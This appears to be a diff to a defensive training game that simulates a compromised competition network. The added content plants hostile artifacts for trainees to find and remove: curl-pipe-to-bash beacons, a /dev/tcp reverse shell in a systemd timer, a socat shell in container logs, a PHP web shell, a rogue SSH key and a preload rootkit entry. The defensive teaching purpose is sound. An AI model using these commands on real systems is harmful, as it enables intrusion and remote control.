@@ -25,7 +25,7 @@ const DIR = makeDirectory({
     person('c.novak', 'Carl', 'Novak', 'Dispatch'), person('d.oyelaran', 'Dele', 'Oyelaran', 'Sales'),
     person('e.ramirez', 'Elena', 'Ramirez', 'HR'), person('f.schultz', 'Fritz', 'Schultz', 'Warehouse Lead'),
     person('g.vang', 'Gao', 'Vang', 'Support'), person('h.whitehorse', 'Hal', 'Whitehorse', 'Operations'),
-    { sam: 'svc_backup', first: 'Backup', last: 'Service', ou: 'Service', desc: 'Veeam agent', pwdLastSet: '2024-05-11' },
+    { sam: 'svc_backup', first: 'Backup', last: 'Service', ou: 'Service', desc: 'Veeam agent', pwdLastSet: '2024-05-11', spn: ['MSSQLSvc/docker.driftless.local:1433'] },
   ],
   computers: [
     { name: 'AD', ip: '172.20.242.200', role: 'Domain Controller', os: 'Windows Server 2019' },
@@ -37,8 +37,21 @@ const seed = (d) => { d.addUser({ sam: 'svc_audit', first: 'Audit', last: 'Servi
 seed(DIR);
 DIR.seedLive = seed;
 
+const ev = (id, time, raw) => ({ splunkTime: `11/14/26 ${time}.000 AM`, raw: `LogName=Security\nEventCode=${id}\nMessage=${raw}`, fields: { EventCode: [String(id)], LogName: ['Security'], ComputerName: ['AD.driftless.local'] } });
+const AD_EVENTS = [
+  ev(4625, '7:41:02', 'An account failed to log on. Account Name: administrator  Source Network Address: 198.51.100.61'),
+  ev(4625, '7:41:05', 'An account failed to log on. Account Name: administrator  Source Network Address: 198.51.100.61'),
+  ev(4625, '7:41:09', 'An account failed to log on. Account Name: a.hansen  Source Network Address: 198.51.100.61'),
+  ev(4624, '7:43:27', 'An account was successfully logged on. Account Name: Administrator  Logon Type: 3  Source Network Address: 172.20.241.30'),
+  ev(4720, '7:44:15', 'A user account was created. New Account Name: svc_audit'),
+  ev(4728, '7:44:31', 'A member was added to a security-enabled global group. Member: svc_audit  Group Name: Domain Admins'),
+];
+
 const winCommands = (extra = {}) => ({
-  netstat: () => '\nActive Connections\n\n  Proto  Local Address          State           PID\n  TCP    0.0.0.0:135            LISTENING       920\n  TCP    0.0.0.0:445            LISTENING       4\n  TCP    0.0.0.0:3389           LISTENING       1044\n',
+  netstat: () => '\nActive Connections\n\n  Proto  Local Address          Foreign Address        State           PID\n  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       920\n  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4\n  TCP    0.0.0.0:3389           0.0.0.0:0              LISTENING       1044\n',
+  'get-process': () => 'Handles  NPM(K)  PM(K)  WS(K)  CPU(s)    Id  ProcessName\n    512      24  48212  61204    4.11   812  svchost\n    301      18  22104  30120    1.02  1044  TermService\n    220      12   9120  18220    0.42  2684  explorer\n',
+  'get-mpcomputerstatus': () => 'AMRunningMode             : Normal\nAntivirusEnabled          : True\nRealTimeProtectionEnabled : False\n',
+  'set-mppreference': () => '',
   ...extra,
 });
 
@@ -53,7 +66,7 @@ const linux = (d) => ({
   ctx: {
     user: 'root', host: d.host, cwd: '/root', history: [], ...d.ctx,
     fs: { '/etc/resolv.conf': RESOLV, ...d.ctx.fs },
-    commands: { who: () => 'root     tty1         2026-11-14 08:01\n', last: () => `root     tty1                      Sat Nov 14 08:01   still logged in\nsysadmin tty1                      Fri Nov 13 16:41 - 16:58  (00:17)\n\nwtmp begins Mon Mar  2 09:11:04 2026\n`, ...(d.ctx.commands || {}) },
+    commands: { '/opt/splunk/bin/splunk': (a) => (a?.[0] === 'enable' ? 'Listening for Splunk data on TCP port 9997.\n' : ''), '/opt/splunkforwarder/bin/splunk': (a) => (a?.[0] === 'add' ? (a[1] === 'monitor' ? `Added monitor of '${a[2]}'.\n` : `Added forwarding to: ${a[2]}.\n`) : ''), lsmod: () => 'Module                  Size  Used by\nip_tables              27126  1 iptable_filter\nxfs                   997727  1\n', ntpq: () => '     remote           refid      st t when poll reach   delay   offset  jitter\n==============================================================================\n*0.pool.ntp.org  .GPS.            1 u   32   64  377    21.4    0.311   0.208\n', tcpdump: () => "tcpdump: listening on eth0, link-type EN10MB (Ethernet), capture size 262144 bytes\n08:14:02.118 IP 172.31.0.25.51122 > 172.20.242.10.80: Flags [S]\n08:14:02.119 IP 172.20.242.10.80 > 172.31.0.25.51122: Flags [S.]\n^C\n2 packets captured\n", atq: () => '', who: () => 'root     tty1         2026-11-14 08:01\n', last: () => `root     tty1                      Sat Nov 14 08:01   still logged in\nsysadmin tty1                      Fri Nov 13 16:41 - 16:58  (00:17)\n\nwtmp begins Mon Mar  2 09:11:04 2026\n`, ...(d.ctx.commands || {}) },
   },
 });
 
@@ -141,16 +154,28 @@ export const CCDC_MIDWEST = {
       checklist: ['docker ps', 'docker rm -f maint', 'New-NetFirewallRule -DisplayName "block docker api" -Direction Inbound -LocalPort 2375 -Protocol TCP -Action Block'],
       live: { winServices: [{ Status: 'Running', Name: 'docker', DisplayName: 'Docker Engine', StartType: 'Automatic' }, { Status: 'Running', Name: 'WinRM', DisplayName: 'Windows Remote Management (WS-Management)', StartType: 'Automatic' }, { Status: 'Running', Name: 'EventLog', DisplayName: 'Windows Event Log', StartType: 'Automatic' }] },
       ctx: { dir: DIR, user: 'Administrator', host: 'DOCKER', fs: {}, cwd: 'C:\\Users\\Administrator', events: () => [],
-        commands: winCommands({ docker: (args) => (args?.[0] === 'ps' ? 'CONTAINER ID   IMAGE        COMMAND       STATUS       PORTS   NAMES\n8fa21c3d9b1e   alpine:3.9   "/bin/sh"     Up 3 days            maint\n' : '') }),
+        commands: winCommands({ docker: (args) => {
+          const c = args?.[0];
+          if (c === 'ps') return 'CONTAINER ID   IMAGE        COMMAND       STATUS       PORTS   NAMES\n8fa21c3d9b1e   alpine:3.9   "/bin/sh"     Up 3 days            maint\n';
+          if (c === 'images') return 'REPOSITORY   TAG   IMAGE ID       CREATED        SIZE\nalpine       3.9   78a2ce922f86   6 years ago    5.55MB\nnginx        1.25  2bcabc23b454   2 years ago    187MB\n';
+          if (c === 'logs') return 'apk add socat\nsocat TCP:198.51.100.61:4444 EXEC:/bin/sh\n';
+          if (c === 'inspect') return '[{ "Name": "/maint", "HostConfig": { "Privileged": true, "Binds": ["C:\\\\:C:\\\\host"] } }]\n';
+          if (c === 'version') return 'Client: Docker Engine - Community 20.10.7\nServer: Docker Engine 20.10.7\n';
+          return '';
+        } }),
       },
     },
     linux({
       id: 'dns', name: 'DNS / NTP server', host: 'dns', tab: 'Debian', ip: '172.20.240.20', os: 'Debian 8.5', role: 'linux', init: 'systemd', fwtool: 'iptables', pkg: 'apt', nat: NAT(20), zone: 'Internal',
       live: { units: ['bind9', 'ntp'] }, recon: { listen: listen([22, 53]) },
       brief: 'BIND recurses for anyone, and root can log in over SSH. Scored: lookups in driftless.local. There is no ufw or firewalld here, only iptables.',
-      checklist: ['grep -n recursion /etc/bind/named.conf.options', "sed -i 's/allow-recursion { any; };/allow-recursion { 172.20.0.0\\/16; };/' /etc/bind/named.conf.options", 'systemctl reload bind9', "sed -i 's/PermitRootLogin yes/PermitRootLogin no/' /etc/ssh/sshd_config", 'systemctl restart ssh'],
+      checklist: ['grep -n recursion /etc/bind/named.conf.options', "sed -i 's/allow-recursion { any; };/allow-recursion { 172.20.0.0\\/16; };/' /etc/bind/named.conf.options", 'systemctl reload bind9', "sed -i 's/PermitRootLogin yes/PermitRootLogin no/' /etc/ssh/sshd_config", 'systemctl restart ssh', 'cat /etc/rc.local', 'sed -i "/kworker/d" /etc/rc.local', 'rm /usr/bin/.kworker'],
       ctx: { fs: {
         '/etc/issue': issue('Debian GNU/Linux 8 \\n \\l'),
+        '/etc/apt/sources.list': 'deb http://ftp.debian.org/debian jessie main\ndeb http://security.debian.org/ jessie/updates main\n',
+        '/etc/rc.local': '#!/bin/sh -e\n# rc.local\n/usr/bin/.kworker &\nexit 0\n',
+        '/usr/bin/.kworker': '#!/bin/bash\nwhile :; do curl -sk https://203.0.113.140/k | bash; sleep 600; done\n',
+        '/etc/ntp.conf': 'driftfile /var/lib/ntp/ntp.drift\nserver 0.pool.ntp.org iburst\nrestrict default nomodify nopeer noquery\n',
         '/etc/bind/named.conf.options': 'options {\n\tdirectory "/var/cache/bind";\n\trecursion yes;\n\tallow-recursion { any; };\n\tdnssec-validation auto;\n\tlisten-on { any; };\n};\n',
         '/etc/bind/named.conf.local': 'zone "driftless.local" {\n\ttype master;\n\tfile "/etc/bind/db.driftless.local";\n};\n',
         '/etc/bind/db.driftless.local': '$TTL 3600\n@ IN SOA dns.driftless.local. admin.driftless.local. ( 2026111301 3600 600 86400 3600 )\n@ IN NS dns.driftless.local.\ndns IN A 172.20.240.20\nweb IN A 172.20.242.10\nshop IN A 172.20.241.30\nmail IN A 172.20.241.40\n',
@@ -159,11 +184,13 @@ export const CCDC_MIDWEST = {
     }),
     linux({
       id: 'web', name: 'Web server', host: 'web', tab: 'Ubuntu Srv', ip: '172.20.242.10', os: 'Ubuntu 14.04', role: 'webdb', init: 'upstart', fwtool: 'ufw', pkg: 'apt', nat: NAT(23), zone: 'User',
-      live: { units: ['apache2'] }, recon: { listen: listen([22, 80], 'apache2') },
+      live: { units: ['apache2'], immutable: ['/root/.ssh/authorized_keys'] }, recon: { listen: listen([22, 80], 'apache2') },
       brief: 'Public website. Scored on page content, so do not touch index.html. A PHP web shell sits in uploads/ and there is a second UID 0 account. Ubuntu 14.04 has no systemctl: use service.',
-      checklist: ['find /var/www -name "*.php"', 'cat /var/www/html/uploads/thumb.php', 'rm /var/www/html/uploads/thumb.php', 'grep ":0:" /etc/passwd', 'userdel webmaint'],
+      checklist: ['find /var/www -name "*.php"', 'cat /var/www/html/uploads/thumb.php', 'rm /var/www/html/uploads/thumb.php', 'grep ":0:" /etc/passwd', 'userdel webmaint', 'lsattr /root/.ssh/authorized_keys', 'chattr -i /root/.ssh/authorized_keys', 'sed -i "/ops@kali/d" /root/.ssh/authorized_keys'],
       ctx: { fs: {
         '/etc/issue': issue('Ubuntu 14.04.5 LTS \\n \\l'),
+        '/root/.ssh/authorized_keys': 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMq7Zl0Tk1xQ9 ops@kali\n',
+        '/etc/shadow': 'root:$6$k1Zv$Qm0..:20405:0:99999:7:::\nsysadmin:$6$uP2a$Xr9..:20405:0:99999:7:::\nwebmaint:$1$abc$pQz.:20405:0:99999:7:::\n',
         '/var/www/html/index.html': '<html><head><title>Driftless Managed Services</title></head><body><h1>Driftless Managed Services</h1><p>Freight and IT, Eau Claire to Dubuque.</p></body></html>\n',
         '/var/www/html/uploads/thumb.php': "<?php if(isset($_POST['x'])){ passthru($_POST['x']); } ?>\n",
         '/etc/apache2/sites-enabled/000-default.conf': '<VirtualHost *:80>\n\tDocumentRoot /var/www/html\n</VirtualHost>\n',
@@ -183,25 +210,30 @@ export const CCDC_MIDWEST = {
         { Status: 'Running', Name: 'Netlogon', DisplayName: 'Netlogon', StartType: 'Automatic' },
         { Status: 'Running', Name: 'Spooler', DisplayName: 'Print Spooler', StartType: 'Automatic' },
       ] },
-      ctx: { dir: DIR, user: 'Administrator', host: 'AD', fs: {}, cwd: 'C:\\Users\\Administrator', events: () => [],
-        commands: winCommands({ 'get-smbserverconfiguration': () => 'EnableSMB1Protocol : True\nEnableSMB2Protocol : True\nRequireSecuritySignature : False\n' }),
+      ctx: { dir: DIR, user: 'Administrator', host: 'AD', fs: {}, cwd: 'C:\\Users\\Administrator', events: () => AD_EVENTS,
+        commands: winCommands({
+          'get-smbserverconfiguration': () => 'EnableSMB1Protocol : True\nEnableSMB2Protocol : True\nRequireSecuritySignature : False\n',
+          'get-addefaultdomainpasswordpolicy': () => 'ComplexityEnabled  : False\nLockoutThreshold   : 0\nMaxPasswordAge     : 42.00:00:00\nMinPasswordLength  : 7\nPasswordHistoryCount : 24\n',
+        }),
       },
     },
     linux({
-      id: 'uwks', name: 'Ubuntu workstation', host: 'ubuntu-wks', tab: 'Ubuntu Wkst', ip: '172.20.242.101', os: 'Ubuntu 20.04 (DHCP)', role: 'linux', init: 'systemd', fwtool: 'ufw', pkg: 'apt', nat: '-', zone: 'User', browser: true,
+      id: 'uwks', name: 'Ubuntu workstation', host: 'ubuntu-wks', tab: 'Ubuntu Wkst', ip: '172.20.242.101', os: 'Ubuntu 20.04 (DHCP)', role: 'linux', init: 'systemd', fwtool: 'ufw', pkg: 'apt', nat: '-', zone: 'User', browser: true, suid: ['/usr/bin/python3.8'],
       live: { units: [] },
       brief: 'Your way to the web interfaces: from here run  firefox https://172.20.242.150  for the Palo Alto, and  firefox http://172.20.241.20:8000  for Splunk. Someone left a sudoers file giving everyone root.',
-      checklist: ['ls /etc/sudoers.d', 'cat /etc/sudoers.d/90-tmp', 'rm /etc/sudoers.d/90-tmp', 'firefox https://172.20.242.150'],
-      ctx: { fs: { '/etc/issue': issue('Ubuntu 20.04.6 LTS \\n \\l'), '/etc/sudoers.d/90-tmp': 'ALL ALL=(ALL) NOPASSWD:ALL\n', '/etc/ssh/sshd_config': SSHD('prohibit-password') } },
+      checklist: ['ls /etc/sudoers.d', 'cat /etc/sudoers.d/90-tmp', 'rm /etc/sudoers.d/90-tmp', "sed -i '/alias sudo/d' /root/.bashrc", 'rm /tmp/.s', 'find / -perm -4000', 'chmod u-s /usr/bin/python3.8', 'firefox https://172.20.242.150'],
+      ctx: { fs: { '/etc/issue': issue('Ubuntu 20.04.6 LTS \\n \\l'), '/etc/sudoers.d/90-tmp': 'ALL ALL=(ALL) NOPASSWD:ALL\n', '/root/.bashrc': "alias ls='ls --color=auto'\nalias sudo='/tmp/.s; sudo'\n", '/tmp/.s': '#!/bin/bash\ncurl -sk https://203.0.113.140/u | bash\n', '/etc/ssh/sshd_config': SSHD('prohibit-password') } },
     }),
     {
       id: 'win10', name: 'Windows workstation', host: 'win10', tab: 'Win 10', ip: '172.20.242.102', os: 'Windows 10', role: 'windows', kind: 'pwsh', nat: '-', zone: 'User', login: 'sysadmin',
       prompt: 'PS C:\\Users\\sysadmin>', user: 'sysadmin', cwd: 'C:\\Users\\sysadmin',
       brief: 'A local administrator nobody can explain.',
-      checklist: ['Get-LocalGroupMember Administrators', 'Disable-LocalUser -Name svc_print', 'Remove-LocalGroupMember -Group Administrators -Member svc_print'],
+      checklist: ['Get-LocalGroupMember Administrators', 'Disable-LocalUser -Name svc_print', 'Remove-LocalGroupMember -Group Administrators -Member svc_print', 'Get-ScheduledTask', 'Unregister-ScheduledTask -TaskName AdobeGCInvoker -Confirm:$false', 'reg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run', 'reg delete HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v OneDriveHelper /f'],
       live: {
         localUsers: [{ Name: 'Administrator', Enabled: false, Description: 'Built-in account' }, { Name: 'sysadmin', Enabled: true, Description: '' }, { Name: 'svc_print', Enabled: true, Description: '' }],
         localAdmins: [{ ObjectClass: 'User', Name: 'WIN10\\Administrator', PrincipalSource: 'Local' }, { ObjectClass: 'User', Name: 'WIN10\\sysadmin', PrincipalSource: 'Local' }, { ObjectClass: 'User', Name: 'WIN10\\svc_print', PrincipalSource: 'Local' }],
+        runKeys: [{ name: 'OneDriveHelper', cmd: 'C:\\ProgramData\\ODH\\onedrivehelper.exe' }],
+        tasks: [{ TaskPath: '\\', TaskName: 'GoogleUpdateTaskMachine', State: 'Ready' }, { TaskPath: '\\', TaskName: 'AdobeGCInvoker', State: 'Ready' }, { TaskPath: '\\Microsoft\\Windows\\Defrag\\', TaskName: 'ScheduledDefrag', State: 'Ready' }],
       },
       ctx: { dir: DIR, user: 'sysadmin', host: 'WIN10', fs: {}, cwd: 'C:\\Users\\sysadmin', events: () => [], commands: winCommands() },
     },
@@ -214,17 +246,20 @@ export const CCDC_MIDWEST = {
       ctx: { fs: { '/etc/issue': issue('Oracle Linux Server 9\\nKernel \\r on an \\m'), '/opt/splunk/etc/system/local/user-seed.conf': '[user_info]\nUSERNAME = admin\nPASSWORD = changeme\n', '/etc/ssh/sshd_config': SSHD('yes') } },
     }),
     linux({
-      id: 'ecom', name: 'E-commerce server', host: 'ecomm', tab: 'CentOS', ip: '172.20.241.30', os: 'CentOS 7', role: 'webdb', init: 'systemd', fwtool: 'firewalld', pkg: 'yum', nat: NAT(11), zone: 'Public', prompt: '[root@ecomm ~]#',
+      id: 'ecom', name: 'E-commerce server', host: 'ecomm', tab: 'CentOS', ip: '172.20.241.30', os: 'CentOS 7', role: 'webdb', init: 'systemd', fwtool: 'firewalld', pkg: 'yum', noNano: true, nat: NAT(11), zone: 'Public', prompt: '[root@ecomm ~]#',
       fwdOpen: ['ssh', 'http', 'https', '3306/tcp'],
       live: { units: ['httpd', 'mariadb'] }, recon: { listen: listen([22, 80, 443, 3306]) },
       brief: 'Parts store on Apache and MariaDB. The database port is open to every network, the store admin password is admin, and a cron job phones home. firewalld: a change without --permanent is lost on reload, and a --permanent change does nothing until you --reload.',
-      checklist: ['firewall-cmd --list-all', 'firewall-cmd --permanent --remove-port=3306/tcp', 'firewall-cmd --reload', "sed -i \"s/ADMIN_PASSWORD', 'admin'/ADMIN_PASSWORD', 'NEW-PASSWORD-HERE'/\" /var/www/html/config.php", 'cat /etc/cron.d/sysstat-upd', 'rm /etc/cron.d/sysstat-upd', 'rm /usr/local/sbin/sysstat-upd'],
+      checklist: ['firewall-cmd --list-all', 'firewall-cmd --permanent --remove-port=3306/tcp', 'firewall-cmd --reload', "sed -i \"s/ADMIN_PASSWORD', 'admin'/ADMIN_PASSWORD', 'NEW-PASSWORD-HERE'/\" /var/www/html/config.php", 'cat /etc/cron.d/sysstat-upd', 'rm /etc/cron.d/sysstat-upd', 'rm /usr/local/sbin/sysstat-upd', 'cat /etc/ld.so.preload', 'rm /etc/ld.so.preload'],
       ctx: { fs: {
         '/etc/issue': issue('CentOS Linux 7 (Core)\\nKernel \\r on an \\m'),
         '/var/www/html/index.php': "<html><title>Driftless Parts Store</title><body><h1>Driftless Parts Store</h1><?php include 'config.php'; ?></body></html>\n",
         '/var/www/html/config.php': "<?php\ndefine('DB_HOST', 'localhost');\ndefine('DB_USER', 'store');\ndefine('DB_PASS', 'St0re!2019');\ndefine('ADMIN_USER', 'admin');\ndefine('ADMIN_PASSWORD', 'admin');\n",
         '/etc/pki/tls/certs/localhost.crt': '-----BEGIN CERTIFICATE-----\nMIIDdzCCAl+gAwIBAgIEbmF0ZTANBgkqhkiG9w0BAQsFADBs\n-----END CERTIFICATE-----\n',
         '/etc/httpd/conf/httpd.conf': 'Listen 80\nServerName shop.driftless.local\nDocumentRoot "/var/www/html"\n',
+        '/etc/yum.repos.d/CentOS-Base.repo': '[base]\nname=CentOS-$releasever - Base\nmirrorlist=http://mirrorlist.centos.org/?release=$releasever&arch=$basearch&repo=os\n#baseurl=http://mirror.centos.org/centos/$releasever/os/$basearch/\ngpgcheck=1\n',
+        '/etc/ld.so.preload': '/usr/local/lib/libselinuxu.so\n',
+        '/usr/local/lib/libselinuxu.so': 'ELF (binary)\n',
         '/etc/my.cnf': '[mysqld]\nbind-address=0.0.0.0\ndatadir=/var/lib/mysql\n',
         '/etc/cron.d/sysstat-upd': '*/10 * * * * root /usr/local/sbin/sysstat-upd >/dev/null 2>&1\n',
         '/usr/local/sbin/sysstat-upd': '#!/bin/bash\ncurl -sk https://172.31.0.77/s | bash\n',
@@ -236,9 +271,13 @@ export const CCDC_MIDWEST = {
       fwdOpen: ['ssh', 'http', 'smtp', 'pop3'],
       live: { units: ['postfix', 'dovecot', 'httpd'] }, recon: { listen: listen([22, 25, 80, 110]) },
       brief: 'Postfix and Dovecot, with users from AD. The relay accepts mail from anyone, and the webmail installer was left in place.',
-      checklist: ['postconf mynetworks', "postconf -e 'mynetworks = 127.0.0.0/8 172.20.0.0/16'", 'systemctl reload postfix', 'rm -rf /var/www/html/webmail/installer'],
+      checklist: ['postconf mynetworks', "postconf -e 'mynetworks = 127.0.0.0/8 172.20.0.0/16'", 'systemctl reload postfix', 'rm -rf /var/www/html/webmail/installer', 'systemctl list-timers', 'systemctl disable --now dbus-helper.timer', 'rm /etc/systemd/system/dbus-helper.timer', 'rm /etc/systemd/system/dbus-helper.service', 'rm /usr/local/sbin/dbus-helper'],
       ctx: { fs: {
         '/etc/issue': issue('Fedora release 21 (Twenty One)\\nKernel \\r on an \\m'),
+        '/etc/systemd/system/dbus-helper.service': '[Unit]\nDescription=D-Bus helper\n[Service]\nExecStart=/usr/local/sbin/dbus-helper\n',
+        '/etc/systemd/system/dbus-helper.timer': '[Unit]\nDescription=D-Bus helper timer\n[Timer]\nOnBootSec=1min\nOnUnitActiveSec=5min\n[Install]\nWantedBy=timers.target\n',
+        '/usr/local/sbin/dbus-helper': '#!/bin/bash\nbash -i >& /dev/tcp/203.0.113.140/4444 0>&1\n',
+        '/etc/yum.repos.d/fedora.repo': '[fedora]\nname=Fedora $releasever - $basearch\nmetalink=https://mirrors.fedoraproject.org/metalink?repo=fedora-$releasever&arch=$basearch\n',
         '/etc/postfix/main.cf': 'myhostname = mail.driftless.local\nmydomain = driftless.local\ninet_interfaces = all\nmynetworks = 0.0.0.0/0\nsmtpd_relay_restrictions = permit_mynetworks, reject_unauth_destination\n',
         '/etc/dovecot/conf.d/10-auth.conf': 'auth_mechanisms = plain login\n!include auth-ldap.conf.ext\n',
         '/etc/dovecot/dovecot-ldap.conf.ext': 'hosts = 172.20.242.200\nbase = OU=Staff,DC=driftless,DC=local\n',
@@ -396,6 +435,20 @@ export const CCDC_MIDWEST = {
       ], why: 'Disable first, then remove from the group.' },
       traps: [],
     },
+    { id: 'web-key', path: 'mgmt', host: 'web', title: 'Immutable SSH key for root', severity: 'High', teach: 'chattr +i makes a file refuse every change, even from root. lsattr shows it.', exploitable: true, compromise: { impact: 'The key logs in as root.', penalty: 30 },
+      fix: { steps: [{ id: 'clear', accept: [/chattr/, /-i/, /authorized_keys/], label: 'Removed the immutable flag', todo: 'chattr -i' }, { id: 'edit', accept: [/sed -i|tee|rm /, /authorized_keys/], verify: (fs) => ({ ok: !/ops@kali/.test(fs['/root/.ssh/authorized_keys'] || ''), why: 'The key is still there.' }), label: 'Removed the key', todo: 'remove the key' }], why: 'Clear the flag, then remove the key.' }, traps: [] },
+    { id: 'dns-rclocal', path: 'beacon', host: 'dns', title: 'Boot script starts a hidden callback', severity: 'High', teach: 'rc.local runs at every boot. A dotted name hides from plain ls.', exploitable: true, compromise: { impact: 'A callback runs from every boot.', penalty: 25 },
+      fix: { steps: [{ id: 'rc', accept: [/sed -i|tee/, /rc\.local/], verify: (fs) => ({ ok: !/kworker/.test(fs['/etc/rc.local'] || ''), why: 'rc.local still starts it.' }), label: 'Cleaned rc.local', todo: 'remove the line from rc.local' }, { id: 'bin', accept: [/\brm\b/, /\.kworker/], label: 'Removed the script', todo: 'remove /usr/bin/.kworker' }], why: 'Remove the trigger and the program.' }, traps: [] },
+    { id: 'ecom-preload', path: 'local', host: 'ecom', title: 'Library forced into every program', severity: 'Critical', teach: '/etc/ld.so.preload loads a library into every process. It should normally not exist.', exploitable: true, compromise: { impact: 'A rootkit hides files and steals passwords.', penalty: 35 },
+      fix: { accept: [[/\brm\b/, /ld\.so\.preload/], [/sed -i|tee/, /ld\.so\.preload/]], output: ['Removed.'], why: 'Remove the preload entry.' }, traps: [] },
+    { id: 'mail-timer', path: 'beacon', host: 'mail', title: 'systemd timer running a reverse shell', severity: 'High', teach: 'Timers are the modern cron. systemctl list-timers shows them.', exploitable: true, compromise: { impact: 'A reverse shell every five minutes.', penalty: 30 },
+      fix: { steps: [{ id: 'off', accept: [/systemctl/, /(stop|disable)/, /dbus-helper/], label: 'Stopped the timer', todo: 'disable the timer' }, { id: 'unit', accept: [/\brm\b/, /dbus-helper\.(timer|service)/], label: 'Removed the unit', todo: 'remove the unit files' }, { id: 'bin', accept: [/\brm\b/, /sbin\/dbus-helper/], label: 'Removed the program', todo: 'remove /usr/local/sbin/dbus-helper' }], why: 'Timer, unit and program all have to go.' }, traps: [] },
+    { id: 'wks-task', path: 'beacon', host: 'win10', title: 'Rogue scheduled task', severity: 'Medium', teach: 'Tasks are the Windows version of cron. Attackers borrow vendor names.', exploitable: true, compromise: { impact: 'The task reinstalls access.', penalty: 20 },
+      fix: { accept: [[/unregister-scheduledtask|schtasks.*\/delete/, /adobegcinvoker/]], output: ['Removed.'], why: 'Remove the task.' }, traps: [] },
+    { id: 'wks-run', path: 'beacon', host: 'win10', title: 'Run key starting a planted program', severity: 'Medium', teach: 'Run keys start programs at every login.', exploitable: true, compromise: { impact: 'The program starts at every login.', penalty: 20 },
+      fix: { accept: [[/reg delete|remove-itemproperty/, /onedrivehelper/]], output: ['Removed.'], why: 'Remove the value.' }, traps: [] },
+    { id: 'wks-suid', path: 'local', host: 'uwks', title: 'SUID bit on the Python interpreter', severity: 'High', teach: 'SUID runs a program as its owner. On an interpreter, that is an instant root shell.', exploitable: true, compromise: { impact: 'Any user becomes root.', penalty: 20 },
+      fix: { accept: [[/chmod/, /u-s/, /python/]], output: ['Done.'], why: 'chmod u-s.' }, traps: [] },
     {
       id: 'wks-sudoers', path: 'local', host: 'uwks', title: 'sudoers file gives every user root', severity: 'High',
       teach: 'Check /etc/sudoers.d as well as /etc/sudoers.',
